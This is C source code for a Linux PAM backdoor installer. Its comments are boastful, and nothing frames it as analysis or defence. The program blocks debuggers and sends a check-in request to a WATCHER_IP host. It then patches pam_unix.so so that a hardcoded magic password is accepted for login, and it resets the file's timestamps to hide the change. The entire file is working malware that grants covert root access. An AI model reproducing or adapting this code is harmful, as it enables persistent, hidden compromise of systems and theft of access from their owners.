#include <stdio.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <sys/ptrace.h>
#include <utime.h>
#include <elf.h>
#include <netinet/in.h>


char clipcode[] =                    /* magic satanic hellc0de */

 "\x55\x89\xe5\x8b\x4c\x24\x10\x31\xc0\x81\x39\x24\x26\x6d\x34"
 "\x75\x14\x83\xc1\x04\x81\x39\x67\x31\x63\x2e\x75\x09\x8b\x4c"
 "\x24\x08\x89\x41\x28\x5d\xc3";

/* 37 bytes, that got u r00t!! */


  /*  http-request 2 send data */
char http_req[] =

 "GET /cgi-bin/test.pl HTTP/1.1\r\n"
 "Host: some.shitty.domain.com\r\n"
 "Accept: */*\r\nUser-Agent: Test\r\n\r\n";


int main()
{
  int i, fd;
  unsigned long area, back, addr;
  char *file, *b, *s;
  struct stat fsz;
  struct utimbuf t;
  struct sockaddr_in sin;
  Elf32_Ehdr elf_hdr;
  Elf32_Shdr sec_hdr;
  Elf32_Sym  func;

 /* anti-tracer code */

  if (ptrace(PTRACE_TRACEME, getpid(), 0, 0) < 0){
    printf("none-disclosure bitch!!\n");
    return -1;
  }


 /* network shit */

  i = socket(2, SOCK_STREAM, 0);
  memset(&sin, 0, 16);
  sin.sin_family = AF_INET;
  sin.sin_port = htons(80);
  sin.sin_addr.s_addr = inet_addr(WATCHER_IP);

  connect(i, (struct sockaddr *)&sin, 16);
  sendto(i, &http_req, strlen(http_req));


 /* infect part */
  fd = open("/lib/security/pam_unix.so", O_RDWR);
  if (fd < 0) return 1;
  
  fstat(fd, &fsz);

  file = mmap(0, fsz.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

  memcpy(&elf_hdr, file, sizeof(elf_hdr));

  s = file + elf_hdr.e_shoff + 2*elf_hdr.e_shentsize;
  memcpy(&sec_hdr, s, elf_hdr.e_shentsize);
  s = file + sec_hdr.sh_offset;
  
  for (i = 0; i < sec_hdr.sh_size; i+=sizeof(func)){
    memcpy(&func, s+i, sizeof(func));

    if (func.st_name == 0) continue;
    b = s + sec_hdr.sh_size + func.st_name;
        
    if (strncmp(b, "_unix_ve",8) == 0){
      back = func.st_value;
      break;
    }
    
  }

 /* make 1337 flags */
  memcpy(&sec_hdr, file + elf_hdr.e_shoff + 4*elf_hdr.e_shentsize,
    elf_hdr.e_shentsize);
    
  if (sec_hdr.sh_flags == 0x06){
    close(fd);
    return 1;
  }
  
  sec_hdr.sh_flags = 0x06;
  sec_hdr.sh_type = 0x01;
  memcpy(file + elf_hdr.e_shoff + 4*elf_hdr.e_shentsize, &sec_hdr, sizeof(sec_hdr));
  area = sec_hdr.sh_offset;

  b = file+area;
  memcpy(b, &clipcode, strlen(clipcode));
  b+=strlen(clipcode);
  memcpy(b, file+back+3, 3);
  b+=3;
  memset(b, 0xe9, 1);
  b++;
  addr = back-area-strlen(clipcode)-2;
  memcpy(b, &addr, 4);  // build jump-back opcodez
  
  memset(file+back, 0xe9, 1);
  memset(file+back+5, 0x90, 1);
  addr = 0xffffffff - (back - area + 4);  // do jmp 2 area
  memcpy(file+back+1, &addr, 4);      // instructions
  
 /* set back modification and access dates... */
  t.actime = fsz.st_atime;
  t.modtime = fsz.st_mtime;
  utime("/lib/security/pam_unix.so", &t);

  close(fd);
  return 0;
}
